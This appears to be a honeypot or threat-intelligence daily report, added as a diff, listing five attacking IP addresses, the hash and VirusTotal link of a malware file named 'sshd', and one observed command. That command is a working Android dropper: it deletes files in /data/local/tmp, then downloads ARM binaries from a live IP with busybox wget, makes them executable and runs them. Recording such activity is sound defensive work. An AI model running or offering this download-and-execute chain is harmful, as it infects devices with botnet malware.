@@ -1,0 +1,19 @@
+Top 5 IPs for 15-10-2024 :
+
+190.94.243.107
+12.25.181.11
+185.213.85.208
+20.83.189.12
+205.209.156.5
+
+Malware Observed:
+
+File name : sshd
+78ca668d0b80aa116a399b7cb3677470fcbae9b193e312979a0cc995ebc0253a
+https://www.virustotal.com/gui/file/78ca668d0b80aa116a399b7cb3677470fcbae9b193e312979a0cc995ebc0253a
+ 
+
+Commands/exploits observed :
+
+cd /data/local/tmp/; rm *; busybox wget http://87.120.84.247/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://87.120.84.247/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://87.120.84.247/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://87.120.84.247/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android
+
